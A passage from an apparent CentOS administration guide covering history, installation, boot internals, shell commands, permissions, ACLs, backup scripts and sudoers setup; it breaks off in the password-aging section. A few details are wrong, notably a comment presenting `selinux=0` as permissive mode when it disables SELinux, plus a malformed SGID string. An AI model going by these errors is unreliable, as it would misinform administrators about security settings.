---
seoTitle: CentOS Complete Guide – Enterprise Server Administration & Kernel Security
description: "Comprehensive CentOS reference covering installation, DNF package manager, systemd services, firewalld, SELinux policies, Nginx proxy, SSH hardening, and kernel DSA internals."
keywords: "CentOS, CentOS Stream, CentOS commands, RHEL, enterprise Linux, DNF, package manager, SELinux, firewalld, systemd, web server, Nginx, security hardening, ethical hacking, cyber security, kernel DSA, data structures, VR-Rathod, Code-Note, code note vr, vr book"
displayTitle: CentOS – Complete Guide
enableToc: true
comments: true
---

- # History
  collapsed:: true
	- ## The Origins: CAOS Linux and the Birth of CentOS
		- In **2002**, **Gregory Kurtzer** started the **CAOS Linux** project (Community Active Operating System) with the goal of creating a community-driven, stable Linux operating system for clustering and server deployments.
		- As the project progressed, there was a growing community demand for a free, stable enterprise Linux distribution that mirrored the enterprise-grade stability of Red Hat Enterprise Linux (RHEL).
		- To meet this need, the project shifted focus toward rebuilding RHEL from its freely available Source RPMs (SRPMs). This effort led to the creation of **CentOS** (Community ENTerprise Operating System) in **2004**.
		- The founding team included **Gregory Kurtzer**, **Rocky McGaugh**, **Lance Davis**, and **David Parsley**.
		- The core value proposition of CentOS was simple but revolutionary: **100% binary compatibility with RHEL**, providing an enterprise-class operating system with zero licensing costs, no subscription requirements, and community-supported forums.
	- ## The Core Development & RHEL Version Mapping
		- Red Hat releases the source code for RHEL packages under the GNU General Public License (GPL). CentOS developers stripped out Red Hat trademarks, logos, and artwork, compiled the source code, and packaged it back into installable RPMs.
		- This downstream rebuild process created a parallel version timeline mapping directly to RHEL major and minor releases:
			- ```
			  RHEL Version   -->   CentOS Rebuild Version   -->   Release Date
			  RHEL 3.x       -->   CentOS 3.1               -->   March 2004
			  RHEL 4.x       -->   CentOS 4.0               -->   March 2005
			  RHEL 5.x       -->   CentOS 5.0               -->   April 2007
			  RHEL 6.x       -->   CentOS 6.0               -->   July 2011
			  RHEL 7.x       -->   CentOS 7.0               -->   July 2014
			  RHEL 8.x       -->   CentOS 8.0               -->   September 2019
			  ```
		- Each major release of CentOS inherited RHEL's long-term support (LTS) lifecycle, guaranteeing **10 years of security updates and maintenance**, making it the absolute standard for web hosting providers, academic institutions, and enterprise server infrastructures.
	- ## The Red Hat Acquisition (2014)
		- In **January 2014**, Red Hat announced that it was officially sponsoring the CentOS project.
		- Under the agreement, the CentOS trademark was transferred to Red Hat, and a new governing board was formed to oversee the project, consisting of both Red Hat employees and core CentOS developers.
		- Red Hat hired several key CentOS developers, providing financial stability, build infrastructure, and faster release cycles for downstream updates.
		- While this move initially reassured users of CentOS's long-term survival, it also centralized control of the project under a single commercial entity.
	- ## The CentOS Stream Pivot & EOL Shock (2020)
		- On **December 8, 2020**, Red Hat and the CentOS Governing Board announced a radical shift in the project's direction.
		- **CentOS Classic (the downstream rebuild) was terminated.**
		- The CentOS project pivoted entirely to **CentOS Stream**, an upstream development platform that sits between Fedora and RHEL.
		- The timelines for support were dramatically cut:
			- ```
			  Distro Version   -->   Original EOL Date   -->   New EOL Date
			  CentOS 8         -->   May 2029            -->   December 31, 2021
			  CentOS 7         -->   June 30, 2024       -->   June 30, 2024 (Kept)
			  ```
		- This decision meant that CentOS 8's lifecycle was shortened by over seven years, leaving millions of production systems stranded.
		- Red Hat positioned CentOS Stream as the future: instead of being a downstream clone that received updates *after* RHEL, CentOS Stream would serve as the development branch *ahead* of RHEL releases.
	- ## The Downstream Legacy & Modern Successors
		- The termination of CentOS Classic created a massive void in the enterprise hosting space, driving the creation of new open-source downstream rebuilds:
			- [[Rocky Linux]]: Founded by original CentOS co-founder Gregory Kurtzer to preserve the downstream rebuild philosophy, governed by the RESF.
			- [[Alma Linux]]: Created by CloudLinux and transitioned into a community-owned foundation (AlmaLinux OS Foundation).
			- **Oracle Linux**: Oracle's own downstream RHEL clone, which has existed since 2006.
		- Meanwhile, CentOS Stream continues to serve as the public development branch for RHEL 9 and future releases.
-
- # Introduction
  collapsed:: true
	- ## What is CentOS?
		- CentOS (Community Enterprise Operating System) is an enterprise-class Linux distribution derived from the sources of Red Hat Enterprise Linux (RHEL).
		- In its classic form, it was a downstream, binary-compatible clone of RHEL.
		- In its modern form, **CentOS Stream** is the upstream development branch for RHEL, containing packages that are slated for upcoming RHEL minor releases.
		- It represents a stable, community-backed server OS that forms the foundation of modern Linux cloud architectures, virtualization nodes, and system administration tooling.
	- ## Upstream vs Downstream Development Models
		- To understand CentOS, you must understand its position in the Red Hat ecosystem:
			- ```
			  Fedora (Cutting-edge) --> CentOS Stream (Mid-stream) --> RHEL (Commercial) --> Rocky/Alma/Oracle (Downstream Clones)
			  ```
			- **Fedora**: The rapid-innovation branch where new technologies are introduced. High velocity, updated every 6 months, short lifecycles.
			- **CentOS Stream**: The continuous delivery pipeline that serves as the upstream source for the next minor release of RHEL. It is stable enough for production but undergoes frequent package updates.
			- **RHEL**: The commercial enterprise operating system, featuring paid support, hardware certifications, and strict stability boundaries.
			- **Rocky/Alma/Oracle Linux**: Downstream rebuilds of RHEL, matching RHEL 1:1 package-for-package.
	- ## Advantages of CentOS
		- **Enterprise Stability**: Packages undergo exhaustive testing in Fedora and RHEL before reaching stable CentOS channels.
		- **Long Lifecycles**: Major versions historically received up to 10 years of security updates (and CentOS Stream versions align with RHEL active support windows).
		- **RHEL Compatibility**: Commands, services, configurations, and administrative skills learned on CentOS translate 1:1 to commercial RHEL environments (skills also apply directly to [[Fedora]], [[Rocky Linux]], and [[Alma Linux]]).
		- **Zero Cost**: Full enterprise feature set, including security controls like SELinux, firewalld, and high-performance filesystems, without subscription fees.
		- **Massive Software Repository**: Access to official BaseOS and AppStream repos, supplemented by the EPEL repository and RPM Fusion.
	- ## Disadvantages of CentOS
		- **CentOS Stream Shift**: CentOS Stream is no longer a strict downstream clone; it contains packages slightly ahead of RHEL, which can occasionally introduce behavioral variations.
		- **Older Software Versions**: To preserve stability, CentOS runs conservative versions of core utilities (e.g., Python, GCC, PostgreSQL). Developers wanting cutting-edge packages must use AppStream modules or third-party repositories.
		- **Source Code Accessibility Restrictions**: Red Hat's changes to source code availability have made downstream rebuilding more complex for the community.
		- **Resource Footprint**: RHEL-family OS footprints are typically larger than minimal distributions like [[Alpine Linux]] or [[Debian]].
	- ## Core Use Cases
		- **Production Web Servers**: Ideal for running Apache, Nginx, PHP, and databases (LAMP/LEMP stacks) in virtualized cloud environments.
		- **Enterprise Databases**: Hosts high-load PostgreSQL, MariaDB, and Oracle Database instances.
		- **Development Environments**: Acts as a local staging environment for software destined to be deployed on RHEL production cloud infrastructures.
		- **Virtualization Hosts**: Supports Kernel-based Virtual Machines (KVM) and container runtimes (Podman, Docker) with hardware-level stability.
	- ## CentOS vs Alternative Distros
		- | Feature | CentOS Stream | Ubuntu Server | Debian | Alpine Linux |
		  |---------|---------------|---------------|--------|--------------|
		  | Base Family | Red Hat / RHEL | Debian / Ubuntu | Debian | Independent |
		  | Package Format | RPM | DEB | DEB | APK |
		  | Package Manager | DNF / YUM | APT | APT | APK |
		  | Default Security | SELinux | AppArmor | None / Optional | grsecurity / PaX |
		  | Release Cycle | Continuous (Upstream) | LTS (2 Years) | LTS (2-3 Years) | Stable (6 Months) |
		  | Target Use Case | Enterprise Clouds | Cloud / Devs | Stable Servers | Containers / Embedded |
-
- # Installation & Setup
  collapsed:: true
	- ## System Requirements
		- To deploy CentOS Stream, the target hardware must meet the following specifications:
			- ```
			  Metric             -->   Minimal (CLI Server)   -->   Server with GUI (GNOME)
			  CPU Architecture   -->   x86_64, aarch64, s390x -->   x86_64, aarch64
			  CPU Cores          -->   1 Core (2 recommended) -->   2 Cores (4 recommended)
			  RAM                -->   1.5 GB                 -->   4 GB+
			  Disk Space         -->   10 GB                  -->   30 GB+ (SSD preferred)
			  Network Interface  -->   1x Ethernet Port       -->   1x Ethernet / Wi-Fi Card
			  ```
	- ## ISO Downloading and Verification
		- Always download official ISOs from the CentOS mirrors.
		- Once downloaded, verify the SHA-256 hash of the ISO to ensure data integrity and prevent security compromise.
		- ```bash
		  # Download the CentOS Stream ISO and the SHA256SUM file
		  # Run the verification command:
		  sha256sum CentOS-Stream-9-latest-x86_64-dvd1.iso
		  
		  # Compare the output hash with the one in the SHA256SUM manifest:
		  # Output: 5f98a28e9389e1b2... CentOS-Stream-9-latest-x86_64-dvd1.iso
		  ```
	- ## Installation Media Creation
		- Use the `dd` command on Linux to write the ISO to a USB drive:
		- ```bash
		  # Identify the USB block device (e.g., /dev/sdb). Do not target your system drive!
		  lsblk
		  
		  # Write the ISO to the block device directly
		  sudo dd if=CentOS-Stream-9-latest-x86_64-dvd1.iso of=/dev/sdb bs=4M status=progress conv=fdatasync
		  ```
	- ## Partitioning Layouts
		- CentOS defaults to **Logical Volume Manager (LVM)** and the **XFS** filesystem.
		- Standard partition allocation recommendations for a 100 GB server disk:
			- ```
			  Partition   -->   Size     -->   Type   -->   Mount Point   -->   Description
			  /dev/sda1   -->   600 MB   -->   FAT32  -->   /boot/efi     -->   EFI System Partition (ESP)
			  /dev/sda2   -->   1 GB     -->   XFS    -->   /boot         -->   Static files for boot loader & kernel
			  /dev/sda3   -->   Rest     -->   LVM PV -->   [LVM Volume]  -->   Physical volume containing LVM groups
			  ```
		- Managing LVM Volumes post-install:
		- ```bash
		  # Display LVM info
		  sudo pvs      # Physical Volumes
		  sudo vgs      # Volume Groups
		  sudo lvs      # Logical Volumes
		  
		  # Extend a logical volume with XFS filesystem online
		  # 1. Extend the logical volume path
		  sudo lvextend -L +10G /dev/mapper/cs-root
		  
		  # 2. Resize the XFS file system to fill the extended space
		  sudo xfs_growfs /
		  ```
	- ## XFS vs Ext4 Filesystems
		- CentOS uses **XFS** as its default filesystem.
		- **XFS**:
			- Optimized for high-throughput, parallel I/O operations.
			- Supports filesystems up to 8 Exabytes.
			- Allocates space using Allocation Groups (AGs) to improve multi-threaded performance.
			- **Warning**: XFS filesystems **cannot be shrunk online or offline**. If you need to shrink filesystems frequently, partition with **Ext4** instead.
		- **Ext4**:
			- Standard journaling filesystem.
			- Supports shrinking and growing operations.
			- Faster metadata operations on small files compared to XFS.
	- ## First Boot Configurations
		- Configure core settings immediately after installation:
		- ```bash
		  # 1. Update the local package metadata cache and update all packages
		  sudo dnf update -y
		  
		  # 2. Configure the system hostname
		  sudo hostnamectl set-hostname node01.enterprise.local
		  
		  # 3. Synchronize system time using chrony
		  sudo systemctl enable --now chronyd
		  
		  # Check chrony sync status
		  chronyc tracking
		  
		  # Show active time sources
		  chronyc sources -v
		  
		  # 4. Set the system timezone
		  sudo timedatectl set-timezone UTC
		  ```
-
- # Kernel & Architecture
  collapsed:: true
	- ## The Monolithic Kernel Architecture
		- The Linux kernel is monolithic: all operating system services (process scheduling, virtual memory management, device drivers, network stacks, filesystem drivers) run in the supervisor CPU execution ring (Kernel Space).
		- Key components of the kernel:
			- ```
			  +--------------------------------------------------------------+
			  |                        User Space Application                |
			  +--------------------------------------------------------------+
			  |                         System Call Interface                |
			  +--------------------------------------------------------------+
			  | Kernel Space:                                                |
			  |  [Process Scheduler]  [Virtual Memory]  [Virtual File System]|
			  |  [Network Stack]      [Device Drivers]  [IPC Subsystems]     |
			  +--------------------------------------------------------------+
			  |                           Hardware Layer                     |
			  +--------------------------------------------------------------+
			  ```
	- ## The RHEL ABI Stability Guarantee
		- Red Hat commits to strict **Application Binary Interface (ABI)** stability across major releases.
		- This guarantees that software compiled on version 9.0 will continue to run without recompilation on version 9.4, 9.9, etc.
		- To achieve this, Red Hat backports bug fixes, performance improvements, and security patches to the baseline kernel version (e.g., kernel 5.14 in CentOS Stream 9) instead of advancing to newer upstream versions.
	- ## The Linux Boot Process Step-by-Step
		- 1. **POST (Power-On Self-Test)**: System firmware (BIOS or UEFI) initializes and tests hardware.
		- 2. **Boot Loader (GRUB2)**: The firmware reads the boot block (MBR) or the EFI System Partition (ESP) to load GRUB2.
		- 3. **Kernel Loading**: GRUB2 reads its configuration file `/boot/grub2/grub.cfg`, loads the compressed kernel image (`vmlinuz-<version>`), and extracts it into RAM.
		- 4. **initramfs Mount**: GRUB2 loads the `initramfs-<version>.img` (Initial RAM Filesystem, which is dracut-generated) into memory. The kernel uses the temporary drivers in initramfs to mount the real root filesystem (`/`).
		- 5. **systemd Initialization**: The kernel starts `/sbin/init` (which is symlinked to `systemd`) as Process ID 1 (PID 1).
		- 6. **Target Execution**: `systemd` processes system units, mounts filesystems, starts daemons, and shifts the system into the configured target state (e.g., `multi-user.target` or `graphical.target`).
	- ## Linux File System Hierarchy (FHS)
		- CentOS adheres strictly to the Filesystem Hierarchy Standard:
			- ```
			  /
			  ├── boot/          Kernel configurations, initramfs images, and GRUB2 files
			  ├── dev/           Device files representing hardware interfaces (e.g., /dev/sda, /dev/urandom)
			  ├── etc/           System-wide configuration files (e.g., /etc/fstab, /etc/resolv.conf)
			  ├── home/          Standard user home directories
			  ├── media/         Auto-mount directory for removable media (USBs, CD-ROMs)
			  ├── mnt/           Temporary manual mount points for administrators
			  ├── opt/           Optional, third-party proprietary applications (e.g., /opt/google)
			  ├── proc/          Virtual filesystem exposing kernel and process state metrics
			  ├── root/          Home directory for the root user (UID 0)
			  ├── run/           Runtime transient data (PIDs, socket connections, cleared on boot)
			  ├── sys/           Virtual filesystem exposing hardware parameters and kernel drivers
			  ├── tmp/           Temporary files (often mounted on RAM as tmpfs)
			  ├── usr/           User binaries, libraries, and documentation
			  │   ├── bin/       Standard user commands (ls, cat, systemctl)
			  │   ├── sbin/      System administration commands (fdisk, iptables, ip)
			  │   ├── lib/       32-bit shared library files
			  │   └── lib64/      64-bit shared library files
			  └── var/           Variable data that persists across reboots
			      ├── log/       System and service log files (messages, secure, audit)
			      └── spool/     Print queues and mail spools
			  ```
	- ## GRUB2 Custom Boot Configurations
		- Do not edit `/boot/grub2/grub.cfg` directly, as it is overwritten during kernel updates. Modify `/etc/default/grub` instead:
		- ```bash
		  # View/Edit GRUB configurations
		  sudo cat /etc/default/grub
		  
		  # Rebuild the GRUB configuration file
		  # For UEFI systems:
		  sudo grub2-mkconfig -o /boot/efi/EFI/centos/grub.cfg
		  
		  # For Legacy BIOS systems:
		  sudo grub2-mkconfig -o /boot/grub2/grub.cfg
		  ```
		- Managing default kernels using the `grubby` tool:
		- ```bash
		  # Get the default boot kernel
		  sudo grubby --default-kernel
		  
		  # Get information on all bootable kernels
		  sudo grubby --info=ALL
		  
		  # Change the default kernel to a specific entry
		  sudo grubby --set-default=/boot/vmlinuz-5.14.0-362.8.1.el9_3.x86_64
		  
		  # Append kernel arguments (e.g., force SELinux into permissive mode at boot)
		  sudo grubby --update-kernel=ALL --args="selinux=0"
		  
		  # Remove specific boot arguments
		  sudo grubby --update-kernel=ALL --remove-args="selinux=0"
		  ```
-
- # Shell & Terminal
  collapsed:: true
	- ## Shell Types in CentOS
		- **sh** (Bourne Shell): Legacy UNIX shell; symlinked to bash on modern systems.
		- **bash** (Bourne-Again Shell): The default shell for CentOS users, containing advanced command history, tab completion, and expansion.
		- **zsh** (Z Shell): Feature-rich shell with advanced theme support and autocorrect modules; must be installed via `dnf`.
		- **ksh** (Korn Shell): Combines features of sh and csh; common in legacy enterprise environments.
	- ## Essential Commands Directory
		- ### File Operations
			- ```bash
			  pwd                        # Show current working directory path
			  ls -laF                    # Detailed file list with hidden files and trailing type indicator
			  mkdir -p /opt/app/configs  # Create nested directories safely without erroring
			  cp -ar /var/www/ /backup/  # Copy directories while preserving attributes, permissions, and links recursively
			  mv srcfile.txt destdir/    # Move file to target directory
			  rm -rf /tmp/junk/          # Recursively force delete directory contents without confirmation prompt
			  ln -s /etc/nginx/ nginx_lnk# Create a symbolic link pointing to a target directory
			  find /var/log/ -name "*.log" -type f -size +10M   # Find files ending in .log over 10MB in size
			  ```
		- ### Process Control
			- ```bash
			  ps auxf                    # Display running processes in a nested parent-child tree layout
			  htop                       # Launch interactive terminal process viewer (requires EPEL)
			  pgrep -l nginx             # Search process list for names matching 'nginx' and return their PIDs
			  kill -15 1234              # Send SIGTERM signal to PID 1234 to request graceful shutdown
			  kill -9 1234               # Send SIGKILL signal to PID 1234 to terminate process instantly
			  killall php-fpm            # Terminate all processes running under the name 'php-fpm'
			  nohup /opt/script.sh &     # Execute script in background and survive logout events
			  jobs                       # Show current background jobs in the shell session
			  bg %1                      # Resume suspended job 1 in the background
			  fg %1                      # Bring background job 1 to the active foreground
			  ```
		- ### System Metrics
			- ```bash
			  uname -r                   # Return the active running kernel release version
			  free -h                    # Show total, used, and free memory (RAM) in human-readable sizes
			  df -hT                     # Output disk space usage by partition, showing filesystem type
			  du -sh /var/log/           # Estimate total disk space occupied by a directory path
			  uptime                     # Print system running duration, logged users, and average load metrics
			  lscpu                      # View CPU architectures, cores, caches, and capabilities
			  lsblk                      # Display block storage devices, sizes, and partition tree
			  ss -tulnp                  # Show listening TCP and UDP sockets with numeric ports and PID associations
			  ```
		- ### Archiving
			- ```bash
			  tar -cvzf archive.tar.gz /etc/  # Create a gzip compressed tar archive of the /etc directory
			  tar -xvzf archive.tar.gz -C /tmp/ # Extract gzip tar archive contents to the /tmp target directory
			  zip -r backup.zip /var/www/     # Recursively zip target files
			  unzip backup.zip -d /var/www/   # Extract zip files to a target directory
			  ```
	- ## File Permissions
		- Permissions are divided into three scopes: **Owner (User)**, **Group**, and **Others (World)**.
		- Represented using numeric notation (octal) or symbolic characters:
			- ```
			  Permission   -->   Octal   -->   Symbolic
			  Read         -->   4       -->   r
			  Write        -->   2       -->   w
			  Execute      -->   1       -->   x
			  None         -->   0       -->   -
			  ```
		- ```bash
		  # Set permissions: owner (read/write/execute), group (read/execute), others (read)
		  chmod 754 script.sh
		  
		  # Set permissions symbolically: add execute to user, remove write from group & others
		  chmod u+x,go-w config.json
		  
		  # Change file ownership to user 'nginx' and group 'webmasters'
		  chown nginx:webmasters /var/www/html/index.php
		  ```
		- ### Special Permissions
			- **SUID (Set User ID)**: File runs with the permissions of the file owner rather than the user executing it (represented by an 's' in the user block: `rwsr-xr-x`).
			- **SGID (Set Group ID)**: File runs with the group permissions of the owner. Directories with SGID set force newly created files to inherit the parent directory's group instead of the creator's group (represented by 's' in the group block: `rwxr-s-r-x`).
			- **Sticky Bit**: Used on directories to prevent users from deleting or renaming files owned by other users, even if they have write access to the directory (represented by 't' in the others block: `rwxrwxrwt`).
			- ```bash
			  # Apply SUID (octal 4000)
			  sudo chmod 4755 /usr/bin/privileged-bin
			  
			  # Apply SGID (octal 2000)
			  sudo chmod 2775 /var/www/shared-dir/
			  
			  # Apply Sticky Bit (octal 1000)
			  sudo chmod 1777 /tmp/shared-upload/
			  
			  # Security hardening: find all SUID binaries on the filesystem
			  find / -perm -4000 -type f 2>/dev/null
			  ```
		- ### Access Control Lists (ACLs)
			- Standard user/group permissions (owner/group/others) are sometimes too coarse-grained. CentOS supports POSIX Access Control Lists (ACLs) to assign granular permissions to specific users or groups without altering file ownerships.
			- ```bash
			  # View ACL settings on a directory
			  getfacl /var/www/html/secure-data/
			  # Output:
			  # # file: var/www/html/secure-data/
			  # # owner: apache
			  # # group: apache
			  # user::rwx
			  # user:developer1:rwx  # Specific user ACL
			  # group::r-x
			  # mask::rwx
			  # other::---
			  
			  # Grant read-write-execute permissions to a specific user 'developer1' on a file
			  sudo setfacl -m u:developer1:rwx /var/www/html/secure-data/config.php
			  
			  # Grant read-only permissions to a group 'audit-team' on a directory
			  sudo setfacl -m g:audit-team:r-x /var/www/html/secure-data/
			  
			  # Define default ACL permissions on a directory so that all newly created files inherit them
			  sudo setfacl -d -m u:developer1:rwx /var/www/html/secure-data/
			  
			  # Remove a specific user ACL from a file
			  sudo setfacl -x u:developer1 /var/www/html/secure-data/config.php
			  
			  # Remove all ACL settings recursively from a directory
			  sudo setfacl -b -R /var/www/html/secure-data/
			  ```
	- ## I/O Redirection & Pipes
		- Standard streams:
			- **stdin (Standard Input)**: File descriptor 0 (input source, default keyboard).
			- **stdout (Standard Output)**: File descriptor 1 (normal output, default terminal screen).
			- **stderr (Standard Error)**: File descriptor 2 (error messages, default terminal screen).
		- ```bash
		  # Redirect stdout to a new file (overwrites file)
		  echo "System Ready" > /var/log/status.txt
		  
		  # Append stdout to a file
		  echo "Reboot scheduled" >> /var/log/status.txt
		  
		  # Redirect errors to error.log
		  ls /root/ 2> /tmp/errors.log
		  
		  # Redirect both stdout and stderr to output.log
		  /opt/backup.sh &> /var/log/backup-exec.log
		  
		  # Discard errors by redirecting to /dev/null
		  find / -name "secret.txt" 2> /dev/null
		  
		  # Pipe stdout of command 1 as stdin to command 2
		  cat /var/log/secure | grep "Failed password"
		  ```
	- ## Advanced Text Processing
		- ### grep (Global Regular Expression Print)
			- ```bash
			  # Case-insensitive, line-numbered search for "error" in directory logs
			  grep -rin "error" /var/log/nginx/
			  
			  # Return lines NOT matching the search pattern
			  grep -v "INFO" application.log
			  ```
		- ### sed (Stream Editor)
			- ```bash
			  # Replace "http" with "https" in a configuration file (in-place modification)
			  sed -i 's/http/https/g' config.xml
			  
			  # Delete lines 5 through 10 from a file
			  sed -i '5,10d' list.txt
			  
			  # Parse access logs: strip out IP addresses and extract paths
			  sed -E 's/^([0-9.]+) - - \[(.*)\] "(GET|POST) ([^ ]+) HTTP.*/\1 -> \4/' /var/log/nginx/access.log
			  ```
		- ### awk (Pattern Scanning and Processing)
			- ```bash
			  # Print the username (field 1) and shell (field 7) from /etc/passwd using ':' as delimiter
			  awk -F':' '{print $1 " uses " $7}' /etc/passwd
			  
			  # Print third column values only if the first column equals "systemd"
			  ps aux | awk '$1 == "dbus" {print $2}'
			  
			  # Scan an Nginx log file and output a summary table counting hits per IP address
			  awk '{ip[$1]++} END {printf "%-20s %s\n", "IP Address", "Hits"; for (i in ip) printf "%-20s %d\n", i, ip[i]}' /var/log/nginx/access.log | sort -rn -k2 | head -n 10
			  ```
		- ### cut
			- ```bash
			  # Extract characters 1 through 10 from each line of input
			  cut -c1-10 syslog.log
			  ```
	- ## Shell Scripting Basics
		- ### Script 1: Basic Audit System
			- Save this as `sys_audit.sh` and make it executable: `chmod +x sys_audit.sh`.
			- ```bash
			  #!/bin/bash
			  # ==============================================================================
			  # Script: sys_audit.sh
			  # Description: Performs basic system metric collections and writes report
			  # Author: VR-Rathod
			  # ==============================================================================
			  
			  # Define Variables
			  REPORT_FILE="/var/log/sys_report.txt"
			  MAX_USAGE=80
			  
			  # Print Banner
			  echo "=== RUNNING SYSTEM AUDIT SCENARIO ==="
			  
			  # Define Array of Core Services
			  SERVICES=("sshd" "firewalld" "chronyd")
			  
			  # Functions
			  check_service() {
			      local sname=$1
			      # Check active status of the service
			      systemctl is-active --quiet "$sname"
			      if [ $? -eq 0 ]; then
			          echo "Service [$sname]: ACTIVE"
			      else
			          echo "Service [$sname]: INACTIVE (Alert!)" >&2
			      fi
			  }
			  
			  # Clear old report
			  > "$REPORT_FILE"
			  
			  # Collect System Metrics
			  {
			      echo "Audit execution date: $(date)"
			      echo "Hostname: $(hostname)"
			      echo "Kernel: $(uname -r)"
			      echo "-----------------------------------"
			  } >> "$REPORT_FILE"
			  
			  # Loop through defined services array
			  echo "Checking critical services..."
			  for svc in "${SERVICES[@]}"; do
			      check_service "$svc" >> "$REPORT_FILE"
			  done
			  
			  # Conditional Check: Disk Usage on Root Partition
			  # Extract numeric percentage value
			  DISK_PERCENT=$(df -h / | awk 'NR==2 {print $5}' | cut -d'%' -f1)
			  
			  if [ "$DISK_PERCENT" -gt "$MAX_USAGE" ]; then
			      echo "WARNING: Root disk utilization is critical at ${DISK_PERCENT}%" | tee -a "$REPORT_FILE"
			  else
			      echo "Root disk space status: Normal (${DISK_PERCENT}%)" >> "$REPORT_FILE"
			  fi
			  
			  echo "Report written to $REPORT_FILE."
			  exit 0
			  ```
		- ### Script 2: Enterprise Backup Automation & Integrity Check
			- Save this script as `/opt/scripts/backup_manager.sh`. It demonstrates intermediate-to-advanced scripting practices, including signal trapping, status logging, database backups, directory archives, disk space calculation, and file cleanup thresholds.
			- ```bash
			  #!/bin/bash
			  # ==============================================================================
			  # Script: backup_manager.sh
			  # Description: Production backup manager for CentOS/RHEL enterprise nodes
			  # Features: MariaDB export, directory gzip compression, aging prune, locks
			  # ==============================================================================
			  
			  # Define Configuration Parameters
			  BACKUP_SRC="/var/www/html"
			  BACKUP_DEST="/backups/enterprise_app"
			  LOG_FILE="/var/log/backup_manager.log"
			  LOCK_FILE="/var/run/backup_manager.lock"
			  RETENTION_DAYS=7
			  
			  # Ensure log path is accessible
			  touch "$LOG_FILE"
			  
			  # Log Logger Helper
			  log_event() {
			      local level=$1
			      local message=$2
			      echo "[$(date '+%Y-%m-%d %H:%M:%S')] [${level}] - ${message}" | tee -a "$LOG_FILE"
			  }
			  
			  # Signal Trapping for Cleanup on termination or unexpected errors
			  cleanup() {
			      log_event "WARNING" "Backup script received exit/termination signal. Releasing lock."
			      rm -f "$LOCK_FILE"
			      exit 1
			  }
			  trap cleanup INT TERM EXIT
			  
			  # Check concurrency lock
			  if [ -e "$LOCK_FILE" ]; then
			      log_event "ERROR" "Backup job already active. File lock found: $LOCK_FILE. Exiting."
			      exit 1
			  fi
			  touch "$LOCK_FILE"
			  
			  log_event "INFO" "Starting enterprise system backup process..."
			  
			  # Ensure target destinations exist
			  if [ ! -d "$BACKUP_DEST" ]; then
			      mkdir -p "$BACKUP_DEST"
			      log_event "INFO" "Created backup directory: $BACKUP_DEST"
			  fi
			  
			  # Perform DB Dump
			  DB_FILE="${BACKUP_DEST}/db_backup_$(date '+%Y%m%d_%H%M%S').sql"
			  log_event "INFO" "Exporting database structure..."
			  mysqldump --all-databases > "$DB_FILE" 2>/dev/null
			  
			  if [ $? -eq 0 ]; then
			      log_event "INFO" "Database exported successfully to: ${DB_FILE}"
			      gzip "$DB_FILE"
			  else
			      log_event "ERROR" "Database backup failed!"
			      # Script exits; trap will remove the lock file automatically
			      exit 1
			  fi
			  
			  # Compress source directories
			  TARGZ_FILE="${BACKUP_DEST}/fs_backup_$(date '+%Y%m%d_%H%M%S').tar.gz"
			  log_event "INFO" "Compressing source files: $BACKUP_SRC..."
			  tar -czf "$TARGZ_FILE" -C "$BACKUP_SRC" .
			  
			  if [ $? -eq 0 ]; then
			      log_event "INFO" "File system compressed successfully to: ${TARGZ_FILE}"
			  else
			      log_event "ERROR" "File compression failed!"
			      exit 1
			  fi
			  
			  # Retention cleanup of old files
			  log_event "INFO" "Pruning backup files older than ${RETENTION_DAYS} days..."
			  find "$BACKUP_DEST" -type f -mtime +"$RETENTION_DAYS" \( -name "*.sql.gz" -o -name "*.tar.gz" \) -exec rm -v {} \; >> "$LOG_FILE" 2>&1
			  
			  log_event "INFO" "Backup cycle completed successfully."
			  
			  # Remove lock file manually and disable trap handler prior to clean exiting
			  trap - INT TERM EXIT
			  rm -f "$LOCK_FILE"
			  exit 0
			  ```
-
- # User & Group Management
  collapsed:: true
	- ## Account Types
		- **Root Account (Superuser)**: UID 0. Complete control over OS variables, processes, hardware, and kernel structures.
		- **System Users**: UID 1 to 999. Created for background daemons, system services, and processes (e.g., mail, dbus, nginx, postgres). They are locked from interactive login.
		- **Regular Users**: UID 1000+. Intended for human administrators, developers, and users.
	- ## User Control Commands
		- ```bash
		  # Create user 'deployer' with bash shell, custom home path, and descriptive comment
		  sudo useradd -m -s /bin/bash -c "Automation Account" deployer
		  
		  # Set password for the new user
		  sudo passwd deployer
		  
		  # Modify user 'deployer' to append them to the system administration group 'wheel'
		  sudo usermod -aG wheel deployer
		  
		  # Change user shell to zsh
		  sudo usermod -s /bin/zsh deployer
		  
		  # Lock the user account (prevents login via password validation)
		  sudo usermod -L deployer
		  
		  # Unlock the user account
		  sudo usermod -U deployer
		  
		  # Delete user 'deployer' and remove their home directory and mailbox files
		  sudo userdel -r deployer
		  ```
	- ## Group Control Commands
		- Groups simplify permission management by allowing permissions to be granted to a collective set of users.
		- ```bash
		  # Create new system group 'devops'
		  sudo groupadd devops
		  
		  # Add user to the group
		  sudo gpasswd -a deployer devops
		  
		  # Remove user from the group
		  sudo gpasswd -d deployer devops
		  
		  # Delete the group
		  sudo groupdel devops
		  ```
	- ## Critical Identity Files
		- `/etc/passwd`: Stores user account parameters (read-accessible to all users).
			- Format: `username:password_placeholder:UID:GID:gecos:home_directory:login_shell`
			- Example: `deployer:x:1001:1001:Automation Account:/home/deployer:/bin/bash`
		- `/etc/shadow`: Stores encrypted password hashes and account expiration flags (accessible only by root).
			- Format: `username:password_hash:last_changed:min_days:max_days:warn_days:inactive_days:expire_date:reserved`
			- Example: `deployer:$6$rounds=40960$salt$hash:19820:0:90:7:::`
		- `/etc/group`: Stores group definitions.
			- Format: `group_name:group_password:GID:user_list`
			- Example: `wheel:x:10:deployer,sysadmin`
	- ## The wheel Group and Sudoers Hardening
		- On CentOS, members of the **wheel** group are granted administrator authorization via `sudo`.
		- To grant root permissions, configure rule lines using the `/sbin/visudo` command:
		- ```bash
		  # Launch visudo to safely edit /etc/sudoers
		  sudo visudo
		  
		  # Configuration Rule Examples:
		  # 1. Standard wheel access (requires password verification)
		  # %wheel  ALL=(ALL)   ALL
		  
		  # 2. Allow user 'deployer' to run systemctl service restarts without password prompt
		  # deployer ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart nginx
		  
		  # 3. Deny user 'deployer' from running commands as root shell
		  # deployer ALL=(ALL) !/usr/bin/bash, !/usr/bin/sh
		  ```
		- Sudoers security rules:
			- Never edit `/etc/sudoers` with generic editors like vim or nano. If you corrupt the file structure, the `sudo` command will break, locking you out of root operations. Always use `visudo`.
	- ## Password Aging Policies
		- Enforce credential changes on regular schedules to comply with enterprise security baselines.
		- ```bash
		  # View password expiration parameters for user 'deployer'
		  sudo chage -l deployer
		  
		  # Force user to change password on their next login session
